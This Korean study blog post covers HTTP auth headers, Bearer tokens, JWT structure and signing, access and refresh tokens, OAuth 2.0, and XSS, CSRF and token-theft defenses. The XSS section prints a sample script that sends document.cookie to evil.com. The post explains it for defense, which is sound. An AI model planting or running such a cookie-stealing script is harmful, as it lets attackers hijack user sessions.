---
title: "[250213] TIL"
excerpt: ""

categories:
  - TIL
tags:
  - [TIL]

permalink: /blog/til/250213

toc: true
toc_sticky: true

date: 2025-02-13
last_modified_at: 2025-02-13
---


# 오늘 한 것

## HTTP 자격증명 헤더

- HTTP 자격 증명 헤더는 클라이언트와 서버가 HTTP 통신 과정에서 자격 증명을 위해 사용 되는 헤더를 말합니다.
- HTTP 자격증명은 왜 알아야할까요?
    - 클라이언트에서 필요한 웹 리소스를 받고자 할 때, 서버에서 리소스를 줘도 되는 클라이언트인지 확인하기 위해 (인증 된 유저인지 확인하기 위해) 알아야합니다.
    - 민감한 데이터에 대해 무단 접근을 방지하기 위해 필수적입니다.

### WWW-Authenticate 헤더

- www-오쏘리케이트
- 서버가 클라이언트한테 인증이 필요함을 알리는 헤더입니다.
- 접근권한을 요구할 때 사용됩니다.

### Authorization 헤더

- 오쏘라이제이션
- 클라이언트가 서버에게 인증을 위한 데이터를 담아서 보내는 헤더입니다.

### Proxy-Authenticate , Proxy-Authorization

- 프록시 서버가 클라이언트한테 인증 정보를 요구할 때 사용하는 헤더
- 클라이언트가 프록시 서버에게 인증을 위한 데이터를 담아서 보낼 때 사용하는 헤더
- 참고) 프록시 서버가 자체적으로 인증을 요구하는 경우가 있을 수 있습니다.

## Bearer Token ( 베어러 토큰 )

- 주로 JWT 나 OAuth 2.0 과 같은 토큰 기반 인증에서 접두사로 사용 됩니다.
- 왜 접두사로 사용할까?
    - OAuth 2.0 프로토콜에서 정의된 표준 토큰 유형이기 때문에, 접두사에 Bearer 를 사용하면 클-서 간의 인증 절차가 일관되고 표준화 된 방식으로 이루어진다.
    - 토큰을 사용한다고 명확하게 의도 전달을 할 수 있다.
    - 다양한 인증 방식 중에 토큰 기반이라는 것을 알 수 있다.

```java
GET /protected/resource HTTP/1.1
Host: example.com
Authorization: Bearer mF_9.B5f-4.1JqM
```

- bearer 외에 Basic, Digest 등이 있는데 요즘은 잘 사용하지 않습니다.

## JSON Web Token (JWT)

- 애플리케이션 간의 안전하고 신뢰성  있는 정보 교환을 위해, JSON 포맷 형식으로 정보를 포함하는 토큰
- JWT를 자체 포함형 토큰이라고도 합니다.
    - 어떤 뜻이냐 ? 필요한 정보를 자체적으로 담고 있어서 별도의 DB 조회 없이도 인증이나 사용자 권한을 확인할 수 있게 된다.
- 왜 사용하냐 ?
    - JWT 토큰은 토큰 자체에 정보를 갖고 있어서 무상태(stateless) 인증이 가능합니다.
    - 즉, 무상태 인증 기능이 가능하게 하기 위해 사용합니다.  → 서버 부하 줄임,
    - 서버는 사용자의 세션(stateful) 유지할 필요 없이 인증 상태를 관리 할 수 있다.
- 참고로 JWT 객체는 JSON 포맷 형식의 데이터에서 base64URL로 인코딩된다.

## JWT 구조 (Header, Payload, Signature)

```java
HEADER.PLAYLOAD.SIGNATURE
```

### Header

- 주로 토큰의 유형, 서명 알고리즘을 정의한다.

```java
{
	"alg" : "HS256" // SHA256 , 사용된 알고리즘
	"typ" : "JWT" // 토큰의 유형 명시
}
```

### Payload

- 토큰에 담길 정보 클레임(claims)을 포함합니다.
- 클레임은 토큰 사용자에 대한 정보나 애플리케이션에 필요한 데이터를 담을 수 있습니다.

```java
{
	"username" : "suzy",
	"iat" : 1609239023,
	"exp" : 1609242623
}
```

- iat (Issued At) 토큰이 발행된 시간 : 유닉스 타임 스탬프 형식으로 표현
- exp (Expiration Time) 토큰의 만료 시간 : 유닉스 타임 스탬프 형식으로 표현

```java
참고 : 유닉스 타임 스탬프 형식이란 ?
= 1970년 1월 1월 자정 (UTC) 이후로 경과된 초(second) 총량
```

### 서명 ( Signature )

- 서명은 **헤더와 페이로드**를 합친 뒤, 지정 된 알고리즘으로 해시하고, 비밀키를 사용하여 서명한 결과
- 서명은 토큰이 변조되지 않았음을 검증하는데 사용합니다.

→ 만약 토큰이 변조 되었다면 서명이랑 페이로드+헤더랑 비교했을 때 다를거니까 변조 됐는지 안됐는지 유효성 검증 있습니다.

## JWT 서명 및 암호화 (HMAC, RSA, ECDSA)

아래는 서명 알고리즘들 입니다. 

서명 알고리즘은 JWT의 무결성을 보장한다.

- 무결성 : 데이터가 전송되거나 저장되는 동안 변경 되지 않았음을 보장하는 속성

JWT 자체는 암호화 되지 않고, 서명만 무결성을 보장함

민감한 정보를 포함해야 할 경우는 추가적인 작업이 더 필요하다고 합니다.

### HMAC ( Hash-based Message Authentication Code )

- 알고리즘 : HMAC-SHA256 , HMAC-SHA384, HMAC-SHA512 등
- 특징 : 대칭 키 알고리즘 ( 비밀키, 공개키 → 같음 )
- 장점 : 구현이 간단하고 빠릅니다.
- 단점 : 비밀 키가 노출되면 누구나 서명을 생성할 수 있기 때문에, 키 관리가 중요합니다.

### RSA (Rivest-Shamir-Adleman)

- 알고리즘 : RS256, RS384, RS512 등
- 특징 : 비대칭 키 알고리즘 ( 비밀키, 공개키 → 다름 ) , 비밀키로 서명, 공개키로 서명을 검증
- 장점 : 공개키를 안전하게 배포할 수 있어, 비밀 키를 노출하지 않고도 서명 검증 가능 (안전!)
- 단점 : HMAC에 비해 서명 생성과 검증이 느립니다.

### ECDSA **(Elliptic Curve Digital Signature Algorithm)**

- 알고리즘 : ES256, ES384, ES512 등
- 특징 : RSA와 유사한 비대칭 키 알고리즘이지만, 타원 곡선을 사용하여 더 작은 키 크기로 동일한 보안 수준으로 제공
- 장점 : RSA보다 더 작은 키 크기인데, 빠른 성능을 제공합니다.
- 단점 : 구현이 복잡할 수 있고, 특정 환경에선 지원되지 않을 수 있습니다.

## 세션 기반 인증과의 비교

- 세션 기반은 서버 메모리나 DB에 로그인 상태를 저장합니다. 즉, stateful 합니다.
    - 서버가 여러 곳에 분산되어있는 MSA 환경에서는 세션을 동기화 하는 과정이 복잡합니다.
    - 로드 밸런스를 구성해야 할 상황에서 정보 공유의 어려움이 있습니다.
- JWT 기반은 인증에 필요한 정보를 토큰에 담습니다. 즉, 서버에 상태를 저장하지 않아서, stateless 합니다.
    - 토큰 탈취 시 사용자가 아닌데 사용자 행동이 가능하게 됩니다.
    - 세션 ID 보다 토큰 크기가 크며 네트워크 오버헤드가 증가 할 수 있습니다.
    - 서버에서 강제로 토큰을 만료시킬 방법이 없어 로그아웃이나 만료처리가 복잡합니다.
        - 여기서 토큰 정보를 저장하고 검사하는 방법이 있겠지만, 세션과 다를바가 없게 되고 stateless로 인한 토큰 장점이 사라집니다.

## Access Token / Refresh Token

### Access Token

- 서버에 대한 접근 권한을 부여하는 데 사용됩니다.
- 일반적으로 짧은 수명을 가집니다.
- 만료되면 더 이상 유효하지 않으며, 새로운 엑세스 토큰을 발급 받아야 합니다.
- 짧은 수명 덕분에 토큰이 노출되더라도 피해를 최소화 할 수 있습니다.
- 민감한 정보를 포함하지 않으며, 주로 사용자 ID, 권한 범위 등을 포함합니다.

### Refresh Token

- 새로운 엑세스 토큰을 발급 받기 위해 사용됩니다.
- 엑세스 토큰이 만료되었을 때, 클라이언트는 리프레시 토큰을 사용하여 새로운 엑세스 토큰을 요청합니다.
- 일반적으로 긴 수명을 가지고, 서버 측에서만 저장 됩니다.
- 리프레시 토큰이 노출되면 새로운 엑세스 토큰을 발급 받을 수 있기 때문에, 엑세스 토큰보다 안전하게 보관해야 합니다.

## OAuth 2.0

- 애플리케이션에 직접 비밀번호를 공유하지 않더라도 권한을 부여해주는 타 서버에게 사용자가 직접 인증을 수행하고 애플리케이션이 인가를 부여 받는 것을 말합니다.

## OAuth 1.0과의 차이점

대부분 현대 서비스에선 2.0을 사용하고 있다고 합니다.

```java
OAuth 1.0
- 복잡한 서명 과정
- 모바일 지원 어려움
- 단일 서명 방식
- 엑세스 토큰만 있음, 토큰 만료 없음

OAuth 2.0
- 간단한 구현
- 모바일 최적화
- 다양한 인증 방식
- 엑세스 토큰, 리프레시 토큰 사용
- HTTPS 필수이나 HTTPS한테 의존적임
```

## 보안 강화 대책 (XSS, CSRF, 토큰 탈취 방지)

### XXS ( Cross-Site Scripting )

**공격 방식:** 

- 웹 사이트에 악성 스크립트를 삽입하여 다른 사용자의 브라우저에서 실행되게 하는 공격
- 사용자의 세션 탈취, 웹 사이트 변조, 악성 코드 전달 등이 가능

```java
<!-- 댓글에 악성 스크립트 삽입 -->
<script>
  fetch('https://evil.com?cookie=' + document.cookie);
</script>
```

**대응 방안:** 

1. 입력값 검증 및 이스케이프 처리
    - HTML 특수 문자 변환
    - JS 코드 실행 방지 등
2. CSP (Content-Security0Policy) 설정
    
    ```java
       Content-Security-Policy: default-src 'self'
    ```
    
    - self 의미
        - 모든 리소스는 현재 도메인에서만 로드 가능
        - 외부 도메인의 리소스는 기본적으로 차단
3. HttpOnly 쿠키 사용
    - 자바스크립트로 접근할 수 없는 쿠키입니다.

### CSRF ( Cross-Site Request Forgery )

**공격 방식:**

- 사용자가 자신의 의지와는 무관하게 공격자가 의도한 행위를 특정 웹 사이트에게 요청하는 공격
- 이미 인증된 사용자의 권한을 악용함

**대응 방안:**

1. CSRF 토큰 사용
2. SamSite 쿠키 설정 
    - 다른 사이트로부터의 쿠키 전송을 제어하는 보안 속성

3. Referrer 검증

- 요청이 실뢰할 수 있는 도메인에서 왔는지 확인

### 토큰 탈취 공격

**공격 방식:**

- JWT나 세션 토큰을 탈취하여 사용자를 가장하는 공격
- XXS, 네트워크 스니핑, 안전하지 않은 저장소  접근 등을 통해 발생할 수 있다.

**대응 방안:** 

1. 토큰 저장 위치 보안
2. 토큰 만료 시간 설정
3. 추가 보안 계층
4. HTTPS 사용